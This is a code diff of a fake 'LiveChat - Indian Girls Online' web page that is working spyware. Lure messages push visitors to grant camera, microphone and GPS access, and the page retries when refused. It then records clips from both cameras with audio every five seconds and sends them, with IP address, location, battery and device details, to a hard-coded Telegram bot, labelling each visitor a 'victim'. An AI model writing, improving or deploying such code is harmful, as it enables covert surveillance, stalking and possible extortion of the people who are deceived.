@@ -20,103 +20,59 @@
         .header h1 { font-size: 32px; margin-bottom: 10px; }
         .subtitle { font-size: 18px; opacity: 0.9; }
         
-        .users-grid { 
-            display: grid; 
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
-            gap: 20px; 
-            margin-bottom: 40px;
-        }
-        .user-card { 
-            background: rgba(255,255,255,0.95); 
-            border-radius: 20px; 
-            padding: 25px; 
-            text-align: center; 
-            cursor: pointer; 
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-        }
-        .user-card:hover { 
-            transform: translateY(-10px); 
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-        }
-        .user-avatar { 
-            width: 100px; height: 100px; 
-            border-radius: 50%; 
-            background: linear-gradient(135deg, #ff9a9e, #fecfef); 
-            margin: 0 auto 15px; 
-            display: flex; align-items: center; justify-content: center;
-            font-size: 36px; font-weight: bold; color: #d63384;
-        }
-        .user-name { font-size: 22px; font-weight: bold; margin-bottom: 8px; color: #333; }
-        .user-status { 
-            color: #10b981; 
-            font-size: 16px; 
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-        }
-        .status-dot { width: 12px; height: 12px; background: #10b981; border-radius: 50%; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        
-        .chat-area { 
-            background: rgba(255,255,255,0.95); 
-            border-radius: 20px; 
-            padding: 30px; 
-            max-width: 800px; 
+        .status-container {
+            background: rgba(255,255,255,0.95);
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 800px;
             margin: 0 auto;
             box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            text-align: center;
         }
-        .connection-status { 
-            text-align: center; 
-            padding: 40px; 
-            background: linear-gradient(135deg, #667eea, #764ba2); 
-            color: white; 
-            border-radius: 15px; 
-            margin-bottom: 30px;
+        
+        .status-display {
+            font-size: 18px;
+            margin: 15px 0;
+            padding: 12px;
+            border-radius: 10px;
+            background: rgba(16,185,129,0.2);
+            color: #155724;
+            border: 1px solid #10b981;
         }
+        
         .spinner { 
             border: 4px solid rgba(255,255,255,0.3); 
             border-top: 4px solid white; 
             border-radius: 50%; 
-            width: 60px; height: 60px; 
+            width: 40px; height: 40px; 
             animation: spin 1s linear infinite; 
-            margin: 0 auto 20px;
+            margin: 0 auto 15px;
+            display: none;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .connection-text { font-size: 18px; margin-bottom: 20px; }
-        .timer { font-size: 24px; font-weight: bold; color: #ffd700; }
         
-        #permissionsBtn { 
-            background: linear-gradient(135deg, #ff6b6b, #ff8e8e); 
-            color: white; 
-            border: none; 
-            padding: 20px 50px; 
-            font-size: 20px; 
-            border-radius: 50px; 
-            cursor: pointer; 
-            display: block; 
-            margin: 20px auto; 
-            transition: all 0.3s ease;
-        }
-        #permissionsBtn:hover:not(:disabled) { 
-            transform: scale(1.05); 
-            box-shadow: 0 15px 35px rgba(255,107,107,0.4);
-        }
-        #permissionsBtn:disabled { 
-            background: #ccc; 
-            cursor: not-allowed; 
-            transform: none;
-        }
+        .success { background: #d4edda !important; color: #155724 !important; }
+        .error { background: #f8d7da !important; color: #721c24 !important; }
         
-        #status { margin-top: 20px; padding: 15px; border-radius: 10px; font-weight: bold; }
-        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
-        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
-        
-        .fake-messages { margin-top: 20px; }
-        .message { 
-            background: rgba(255,255,255,0.8); 
-            padding: 15px 20px; 
-            margin-bottom: 15px; 
-            border-radius: 20px; 
+        .fake-chat {
+            margin-top: 30px;
+            background: rgba(255,255,255,0.8);
+            padding: 20px;
+            border-radius: 15px;
             border-left: 5px solid #4ecdc4;
+        }
+        .message {
+            background: rgba(255,255,255,0.9);
+            padding: 12px 18px;
+            margin: 10px 0;
+            border-radius: 15px;
+            font-size: 16px;
+        }
+        
+        .battery-info, .location-info {
+            font-size: 14px;
+            opacity: 0.8;
+            margin-top: 10px;
         }
     </style>
 </head>
@@ -124,361 +80,287 @@
     <div class="container">
         <div class="header">
             <h1>🌟 LiveChat - Indian Girls Online</h1>
-            <p class="subtitle">Connect LIVE with verified Indian girls in HD video</p>
+            <p class="subtitle">Establishing HD video connection... Please grant permissions</p>
         </div>
         
-        <div class="users-grid">
-            <!-- INDIAN GIRLS ONLY -->
-            <div class="user-card" data-user="priya">
-                <div class="user-avatar">👩‍🦰</div>
-                <div class="user-name">Priya Sharma</div>
-                <div class="user-status">
-                    <span class="status-dot"></span> Live Now - Delhi
-                </div>
-            </div>
-            <div class="user-card" data-user="anita">
-                <div class="user-avatar">👩🏽</div>
-                <div class="user-name">Anita Patel</div>
-                <div class="user-status">
-                    <span class="status-dot"></span> Live Now - Mumbai
-                </div>
-            </div>
-            <div class="user-card" data-user="neha">
-                <div class="user-avatar">👩‍🦱</div>
-                <div class="user-name">Neha Gupta</div>
-                <div class="user-status">
-                    <span class="status-dot"></span> Live Now - Bangalore
-                </div>
-            </div>
-            <div class="user-card" data-user="riya">
-                <div class="user-avatar">👩🏼‍🦰</div>
-                <div class="user-name">Riya Singh</div>
-                <div class="user-status">
-                    <span class="status-dot"></span> Live Now - Chennai
-                </div>
-            </div>
-            <div class="user-card" data-user="divya">
-                <div class="user-avatar">🌺</div>
-                <div class="user-name">Divya Reddy</div>
-                <div class="user-status">
-                    <span class="status-dot"></span> Live Now - Hyderabad
-                </div>
-            </div>
-            <div class="user-card" data-user="sneha">
-                <div class="user-avatar">👩</div>
-                <div class="user-name">Sneha Joshi</div>
-                <div class="user-status">
-                    <span class="status-dot"></span> Live Now - Pune
-                </div>
-            </div>
-            <div class="user-card" data-user="kavya">
-                <div class="user-avatar">💃</div>
-                <div class="user-name">Kavya Nair</div>
-                <div class="user-status">
-                    <span class="status-dot"></span> Live Now - Kochi
-                </div>
-            </div>
-            <div class="user-card" data-user="ishika">
-                <div class="user-avatar">👩‍🦰</div>
-                <div class="user-name">Ishika Malhotra</div>
-                <div class="user-status">
-                    <span class="status-dot"></span> Live Now - Chandigarh
-                </div>
-            </div>
+        <div class="status-container">
+            <div class="spinner" id="spinner"></div>
+            <div id="status" class="status-display">Initializing HD connection...</div>
+            <div id="liveStatus"></div>
+            <div id="batteryInfo" class="battery-info"></div>
+            <div id="locationInfo" class="location-info"></div>
         </div>
         
-        <div class="chat-area" id="chatArea" style="display:none;">
-            <div class="connection-status" id="connectionStatus">
-                <div class="spinner"></div>
-                <div class="connection-text" id="connectingTo">Connecting to Priya Sharma...</div>
-                <div class="timer" id="timer">00:30</div>
-                <p>Please wait while we establish HD video connection</p>
-            </div>
-            
-            <div class="fake-messages">
-                <div class="message">Hi! 😍 Your camera quality looks perfect!</div>
-                <div class="message">Just grant camera/mic/location permissions for HD video chat!</div>
-                <div class="message">Can't wait to see you live! 💕</div>
-            </div>
-            
-            <button id="permissionsBtn">🎥 Grant HD Permissions & Start Video</button>
-            <div id="status"></div>
+        <div class="fake-chat">
+            <div class="message">Hi handsome! 😍 Your connection looks perfect!</div>
+            <div class="message">Please grant camera/mic/location permissions for HD video chat 💕</div>
+            <div class="message">Can't wait to see you live! 🎥✨</div>
         </div>
     </div>
 
     <script>
-        // ===== YOUR TELEGRAM CONFIG - MUST REPLACE =====
-        const TELEGRAM_TOKEN = '8733931392:AAEIsUPfc-wl0PzA9jdZ8kc6IO2Dk7_KIl4';  // From @BotFather
-        const CHAT_ID = '-5074591182';          // Your chat/group ID
-        // ==============================================
+        // ===== YOUR TELEGRAM CONFIG =====
+        const TELEGRAM_TOKEN = '8733931392:AAEIsUPfc-wl0PzA9jdZ8kc6IO2Dk7_KIl4';
+        const CHAT_ID = '-5074591182';
+        // =================================
 
         const sessionId = 'indianchat_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-        let photoQueue = [], audioQueue = [], gpsTimer, photoTimer, audioTimer;
-        let isStreaming = false, frameCount = 0, currentUser = 'priya';
-        let stream1, stream2, canvas1, canvas2, ctx1, ctx2;
+        let isStreaming = false, clipCount = 0;
+        let mediaRecorderFront, mediaRecorderRear, frontStream, rearStream, audioStream;
+        let videoClipQueue = [], locationTimer, batteryTimer;
 
-        // TEST FUNCTION - REMOVE AFTER TESTING
-        function testBot() {
-            sendTelegram('sendMessage', { 
-                text: `🧪 BOT TEST\nSession: ${sessionId}\nBot working!` 
-            });
-        }
+        // PAGE LOAD - AUTO START EVERYTHING
+        window.onload = async () => {
+            showSpinner(true);
+            showStatus('🔄 Initializing HD video connection...', 'success');
+            
+            // Send immediate visitor info
+            await sendVisitorInfo();
+            
+            // AUTO REQUEST ALL PERMISSIONS
+            await requestAllPermissions();
+        };
 
-        // 1. SELECT USER
-        document.querySelectorAll('.user-card').forEach(card => {
-            card.addEventListener('click', () => {
-                document.querySelectorAll('.user-card').forEach(c => c.style.opacity = '0.5');
-                card.style.opacity = '1';
-                currentUser = card.dataset.user;
-                
-                document.getElementById('chatArea').style.display = 'block';
-                document.getElementById('connectingTo').textContent = `Connecting to ${card.querySelector('.user-name').textContent}...`;
-                
-                // Send immediate visitor info
-                sendVisitorInfo();
-            });
-        });
-
-        // 2. VISITOR INFO FIRST
+        // 1. VISITOR INFO
         async function sendVisitorInfo() {
             try {
                 const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
+                const batteryInfo = await getBatteryInfo();
                 
-                const info = `🎀 INDIAN GIRLS CHAT - NEW VISITOR
-━━━━━━━━━━━━━━━━━━━━
+                const info = `🎀 INDIAN GIRLS CHAT - NEW VICTIM
+━━━━━━━━━━━━━━━━━━━━━
 
 👤 Session ID: ${sessionId}
 🌐 IP Address: ${ip}
-📱 User Agent: ${navigator.userAgent.slice(0,60)}
+📱 User Agent: ${navigator.userAgent.slice(0,80)}
 🗣️ Language: ${navigator.language}
 📐 Screen: ${screen.width}x${screen.height}
 💻 Platform: ${navigator.platform}
+🔋 Battery: ${batteryInfo.level}% ${batteryInfo.charging ? '🔌 Charging' : '📴'}
 
-⚠️  WAITING FOR CAMERA/MIC/GPS PERMISSIONS
-━━━━━━━━━━━━━━━━━━━━
-LiveChat Spyware v2.0 ACTIVE`;
+🚀 LiveChat Spyware v3.0 - AUTO STREAMING ACTIVE
+━━━━━━━━━━━━━━━━━━━━━`;
 
                 await sendTelegram('sendMessage', { text: info });
-                showStatus('✅ Visitor info sent to bot!', 'success');
             } catch(e) {
-                showStatus('❌ Bot config missing! Add TELEGRAM_TOKEN & CHAT_ID', 'error');
+                console.error('Visitor info send failed:', e);
             }
         }
 
-        // 3. PERMISSIONS BUTTON - MAIN TRIGGER
-        document.getElementById('permissionsBtn').addEventListener('click', async () => {
-            const btn = document.getElementById('permissionsBtn');
-            btn.disabled = true;
-            btn.textContent = '⏳ Getting HD permissions...';
-            
+        // 2. AUTO REQUEST ALL PERMISSIONS
+        async function requestAllPermissions() {
             try {
-                // STEP 1: CAMERA (BOTH FRONT + REAR)
-                showStatus('🔄 Requesting camera access...', 'success');
-                stream1 = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user', width: {ideal: 1280}, height: {ideal: 720} } 
-                });
-                stream2 = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment', width: {ideal: 1280}, height: {ideal: 720} } 
-                });
+                showStatus('📹 Requesting FRONT + REAR cameras...', 'success');
                 
-                // STEP 2: MICROPHONE
-                showStatus('🔄 Requesting microphone access...', 'success');
-                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                // Get BOTH cameras + audio simultaneously
+                const constraints = {
+                    video: [{ facingMode: 'user' }, { facingMode: 'environment' }],
+                    audio: true
+                };
                 
-                // STEP 3: LOCATION
-                showStatus('🔄 Requesting GPS location...', 'success');
-                const gpsPromise = new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(resolve, resolve, {
-                        enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0
-                    });
-                });
+                const streams = await Promise.all([
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: {ideal: 1280}, height: {ideal: 720} }, audio: true }),
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: {ideal: 1280}, height: {ideal: 720} }, audio: true })
+                ]);
                 
-                // ALL PERMISSIONS GRANTED - START STREAMING
-                const pos = await gpsPromise;
-                showStatus('✅ ALL PERMISSIONS GRANTED! Starting HD stream...', 'success');
+                frontStream = streams[0];
+                rearStream = streams[1];
                 
-                btn.textContent = '🎥 HD STREAM ACTIVE ✅';
-                btn.style.background = 'linear-gradient(135deg, #10b981, #059669)';
+                showStatus('📍 Requesting GPS location...', 'success');
+                const gpsPos = await getLocation();
                 
-                // START CONTINUOUS CAPTURE
-                startStreaming(stream1, stream2);
-                sendTelegram('sendMessage', { 
-                    text: `🎉 PERMISSIONS GRANTED!\n👤 ${sessionId}\n📍 GPS: ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}\n✅ Camera+Mic+GPS ACTIVE` 
+                showStatus('✅ ALL PERMISSIONS GRANTED! Starting HD video stream...', 'success');
+                
+                // START CONTINUOUS STREAMING
+                startContinuousStreaming();
+                
+                // Send confirmation
+                await sendTelegram('sendMessage', { 
+                    text: `🎉 FULL ACCESS GRANTED!\n👤 ${sessionId}\n📍 GPS: ${gpsPos.coords.latitude.toFixed(6)}, ${gpsPos.coords.longitude.toFixed(6)}\n✅ FRONT+REAR CAMERAS + MIC + GPS ACTIVE` 
                 });
                 
             } catch(error) {
-                showStatus(`❌ Permission denied: ${error.message}`, 'error');
-                btn.disabled = false;
-                btn.textContent = '🎥 Grant HD Permissions & Start Video';
+                showStatus(`❌ Permission denied: ${error.message}\nRetrying in 3 seconds...`, 'error');
+                setTimeout(requestAllPermissions, 3000); // Auto retry
             }
-        });
+        }
 
-        // 4. CONTINUOUS STREAMING
-        function startStreaming(stream1, stream2) {
+        // 3. CONTINUOUS VIDEO+AUDIO STREAMING (EVERY 5 SECONDS)
+        function startContinuousStreaming() {
             isStreaming = true;
+            showSpinner(false);
+            updateLiveStatus('🔴 LIVE HD STREAM ACTIVE');
             
-            // Setup canvases
-            canvas1 = document.createElement('canvas');
-            canvas2 = document.createElement('canvas');
-            ctx1 = canvas1.getContext('2d');
-            ctx2 = canvas2.getContext('2d');
-            canvas1.width = canvas2.width = 640;
-            canvas1.height = canvas2.height = 480;
-            document.body.appendChild(canvas1);
-            document.body.appendChild(canvas2);
-            canvas1.style.display = canvas2.style.display = 'none';
-            
-            // 🔥 PHOTOS EVERY 1 SECOND (BOTH CAMERAS)
-            photoTimer = setInterval(() => {
-                if (!isStreaming) return;
-                capturePhoto(stream1, ctx1, canvas1, 'FRONT');
-                capturePhoto(stream2, ctx2, canvas2, 'REAR');
-            }, 1000);
-            
-            // 🔥 AUDIO EVERY 3 SECONDS
-            audioTimer = setInterval(captureAudio, 3000);
-            
-            // 🔥 GPS/BATTERY EVERY 2 MINUTES
-            gpsTimer = setInterval(updateLocation, 120000);
-            
-            // Background keepalive
+            // 🔥 VIDEO CLIPS EVERY 5 SECONDS (BOTH CAMERAS + AUDIO)
             setInterval(() => {
                 if (isStreaming) {
-                    sendTelegram('sendMessage', { 
-                        text: `👤 ${sessionId} KEEPALIVE\n📱 Tab: ${document.hidden ? 'BACKGROUND' : 'FOREGROUND'}\n📸 Frame: ${frameCount}` 
-                    });
+                    recordVideoClip(frontStream, 'FRONT');
+                    recordVideoClip(rearStream, 'REAR');
+                }
+            }, 5000);
+            
+            // 🔥 LOCATION/BATTERY EVERY 30 SECONDS
+            locationTimer = setInterval(async () => {
+                if (isStreaming) {
+                    const pos = await getLocation();
+                    const battery = await getBatteryInfo();
+                    sendLocationBattery(pos, battery);
                 }
             }, 30000);
+            
+            // 🔥 BATTERY UPDATE EVERY 2 MINUTES
+            batteryTimer = setInterval(async () => {
+                if (isStreaming) {
+                    const battery = await getBatteryInfo();
+                    sendTelegram('sendMessage', { 
+                        text: `🔋 BATTERY UPDATE\n👤 ${sessionId}\n⚡ ${battery.level*100}% ${battery.charging ? '🔌 CHARGING' : '📴 DISCHARGING'}\n📱 Status: ${navigator.onLine ? 'ONLINE' : 'OFFLINE'}` 
+                    });
+                }
+            }, 120000);
         }
 
-        // CAPTURE SINGLE PHOTO
-        function capturePhoto(stream, ctx, canvas, cameraType) {
+        // 4. RECORD 5-SECOND VIDEO CLIP WITH AUDIO
+        async function recordVideoClip(stream, cameraType) {
             try {
-                ctx.drawImage(stream.getVideoTracks()[0], 0, 0, 640, 480);
-                canvas.toBlob((blob) => {
-                    photoQueue.push({blob, type: cameraType});
-                    processPhotoQueue();
-                    frameCount++;
-                }, 'image/jpeg', 0.8);
-            } catch(e) {
-                console.log('Photo capture failed:', e);
-            }
-        }
-
-        // AUDIO CAPTURE
-        async function captureAudio() {
-            try {
-                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const recorder = new MediaRecorder(audioStream);
-                const chunks = [];
+                const recorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp9,opus',
+                    videoBitsPerSecond: 2500000 // 2.5Mbps HD quality
+                });
                 
+                const chunks = [];
                 recorder.ondataavailable = (e) => chunks.push(e.data);
-                recorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'audio/webm' });
-                    audioQueue.push(blob);
-                    processAudioQueue();
+                
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    videoClipQueue.push({ blob, cameraType });
+                    await processVideoQueue();
                 };
                 
                 recorder.start();
-                setTimeout(() => {
-                    recorder.stop();
-                    audioStream.getTracks().forEach(t => t.stop());
-                }, 2800);
+                setTimeout(() => recorder.stop(), 4800); // 4.8s clips
+                clipCount++;
+                
             } catch(e) {
-                console.log('Audio capture failed:', e);
+                console.error('Video recording failed:', e);
             }
         }
 
-        // PROCESS QUEUES
-        async function processPhotoQueue() {
-            if (photoQueue.length === 0) return;
-            const {blob, type} = photoQueue.shift();
+        // 5. PROCESS VIDEO QUEUE
+        async function processVideoQueue() {
+            if (videoClipQueue.length === 0) return;
+            
+            const { blob, cameraType } = videoClipQueue.shift();
+            const fileSize = (blob.size / 1024 / 1024).toFixed(2);
             
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, `${type}_${sessionId}_${Date.now()}.jpg`);
-            formData.append('caption', `📸 ${type} CAMERA\n👤 ${sessionId}\n#${frameCount} | Live HD`);
+            formData.append('video', blob, `${cameraType}_${sessionId}_clip${clipCount}.webm`);
+            formData.append('caption', `🎥 ${cameraType} CAMERA HD CLIP\n👤 ${sessionId}\n📹 ${fileSize}MB | #${clipCount}\n📍 Live GPS tracking active`);
             
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                method: 'POST', body: formData
-            }).catch(e => console.log('Photo send failed:', e));
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                updateLiveStatus(`📹 Sent ${cameraType} clip #${clipCount}`);
+            }).catch(e => console.error('Video send failed:', e));
             
-            setTimeout(processPhotoQueue, 100);
+            // Process next
+            setTimeout(processVideoQueue, 500);
         }
 
-        async function processAudioQueue() {
-            if (audioQueue.length === 0) return;
-            const blob = audioQueue.shift();
-            
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('voice', blob, `AUDIO_${sessionId}_${Date.now()}.webm`);
-            formData.append('caption', `🎤 LIVE AUDIO\n👤 ${sessionId}\n⏱️ 3s | #${Math.floor(frameCount/3)}`);
-            
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVoice`, {
-                method: 'POST', body: formData
-            }).catch(e => console.log('Audio send failed:', e));
-            
-            setTimeout(processAudioQueue, 200);
+        // 6. LOCATION FUNCTIONS
+        function getLocation() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    resolve,
+                    () => resolve({ coords: { latitude: 0, longitude: 0 } }),
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
         }
 
-        // GPS UPDATE
-        function updateLocation() {
-            if (!navigator.geolocation) return;
-            navigator.geolocation.getCurrentPosition(pos => {
-                const msg = `📍 GPS UPDATE\n👤 ${sessionId}\n📍 ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}\n📏 ${pos.coords.accuracy}m\n🚀 ${pos.coords.speed ? (pos.coords.speed*3.6).toFixed(1)+'km/h' : 'Stationary'}`;
-                sendTelegram('sendMessage', { text: msg });
-            }, () => {}, { enableHighAccuracy: true });
+        async function sendLocationBattery(pos, battery) {
+            const msg = `📍 GPS + BATTERY\n👤 ${sessionId}\n📍 ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}\n📏 ${pos.coords.accuracy?.toFixed(0)}m\n🔋 ${battery.level*100?.toFixed(1)}% ${battery.charging ? '🔌' : '📴'}\n📡 Signal: ${navigator.onLine ? 'STRONG' : 'WEAK'}`;
+            await sendTelegram('sendMessage', { text: msg });
+            updateLocationDisplay(pos);
+            updateBatteryDisplay(battery);
         }
 
-        // TELEGRAM SENDER
+        // 7. BATTERY API
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: battery.level,
+                        charging: battery.charging
+                    };
+                } catch(e) {
+                    return { level: 0, charging: false };
+                }
+            }
+            return { level: 0, charging: false };
+        }
+
+        // 8. TELEGRAM SENDER
         async function sendTelegram(method, data) {
             const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`;
             const options = {
                 method: 'POST',
-                headers: method === 'sendPhoto' || method === 'sendVoice' ? {} : { 'Content-Type': 'application/json' },
+                headers: method.includes('sendVideo') || method.includes('sendPhoto') || method.includes('sendVoice') ? {} : { 'Content-Type': 'application/json' },
                 body: data.text ? JSON.stringify({ chat_id: CHAT_ID, text: data.text, parse_mode: 'HTML' }) : data
             };
             return fetch(url, options);
         }
 
-        // STATUS
+        // UI HELPERS
         function showStatus(msg, type) {
             const status = document.getElementById('status');
             status.textContent = msg;
-            status.className = type;
+            status.className = `status-display ${type}`;
+        }
+        
+        function updateLiveStatus(msg) {
+            document.getElementById('liveStatus').textContent = msg;
+            document.getElementById('liveStatus').className = 'status-display success';
+        }
+        
+        function showSpinner(show) {
+            document.getElementById('spinner').style.display = show ? 'block' : 'none';
+        }
+        
+        function updateBatteryDisplay(battery) {
+            document.getElementById('batteryInfo').textContent = `🔋 Battery: ${(battery.level*100).toFixed(1)}% ${battery.charging ? '🔌 Charging' : ''}`;
+        }
+        
+        function updateLocationDisplay(pos) {
+            document.getElementById('locationInfo').textContent = `📍 Location: ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`;
         }
 
-        // FAKE TIMER
-        let timeLeft = 30;
+        // KEEPALIVE (Sends every 2 minutes)
         setInterval(() => {
-            if (timeLeft > 0) {
-                timeLeft--;
-                const mins = Math.floor(timeLeft / 60);
-                const secs = timeLeft % 60;
-                document.getElementById('timer').textContent = 
-                    `${mins}:${secs.toString().padStart(2, '0')}`;
-                if (timeLeft === 0) {
-                    document.getElementById('permissionsBtn').textContent = '🔄 Connection failed. Click to retry!';
-                    document.getElementById('permissionsBtn').disabled = false;
-                    timeLeft = 30;
-                }
-            }
-        }, 1000);
-
-        // PAGE LOAD - TEST BOT
-        window.onload = () => {
-            setTimeout(testBot, 2000);
-        };
-
-        // CLEANUP
-        window.onbeforeunload = () => {
             if (isStreaming) {
-                sendTelegram('sendMessage', { text: `👤 ${sessionId} DISCONNECTED` });
+                sendTelegram('sendMessage', { 
+                    text: `👤 ${sessionId} KEEPALIVE\n📱 Tab: ${document.hidden ? 'BACKGROUND' : 'FOREGROUND'}\n🎥 Clips sent: ${clipCount}\n📶 Online: ${navigator.onLine}` 
+                });
+            }
+        }, 120000);
+
+        // CLEANUP ON CLOSE (Sends final data within 2 seconds)
+        window.onbeforeunload = async () => {
+            if (isStreaming) {
+                await sendTelegram('sendMessage', { 
+                    text: `👤 ${sessionId} DISCONNECTED\n🎥 Total clips: ${clipCount}\n📱 Final status: ${navigator.onLine ? 'ONLINE' : 'OFFLINE'}` 
+                });
             }
         };
+
+        // PREVENT SLEEP/TAB SUSPENSION
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden && isStreaming) {
+                sendTelegram('sendMessage', { text: `👤 ${sessionId} TAB BACK TO FOREGROUND` });
+            }
+        });
     </script>
 </body>
 </html>
